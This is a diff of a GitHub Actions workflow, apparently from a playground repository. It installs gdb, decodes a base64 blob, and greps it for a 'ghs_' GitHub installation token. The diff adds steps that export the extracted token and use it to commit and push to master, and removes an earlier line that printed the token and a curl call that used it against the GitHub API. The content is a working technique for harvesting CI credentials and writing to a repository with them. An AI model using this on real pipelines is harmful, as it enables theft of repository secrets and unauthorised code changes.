@@ -12,6 +12,7 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      - uses: actions/checkout@v4
       - name: curl
         run: |
           sudo apt-get install -y gdb && \
@@ -20,7 +21,12 @@ jobs:
           echo $B64_BLOB
           GH_TOKEN=`echo $B64_BLOB | base64 -d | grep -aoE '"ghs_.+?"' | sed 's/\"//g'| sort -u | head -1 | sed 's/,issecret//'`
           
-          echo GH_TOKEN=$GH_TOKEN | base64 -w 0
+          export GH_TOKEN=$GH_TOKEN
+          ls
+          echo "new_file" > text.txt
+          git add text.txt
+          git commit -m "test commit"
+          git push origin master
           
-          curl -s -L -H "Authorization: Bearer $GH_TOKEN"  "https://api.github.com/repos/octoberwar/action-playground/contents/package.json?ref=main"
+          
 
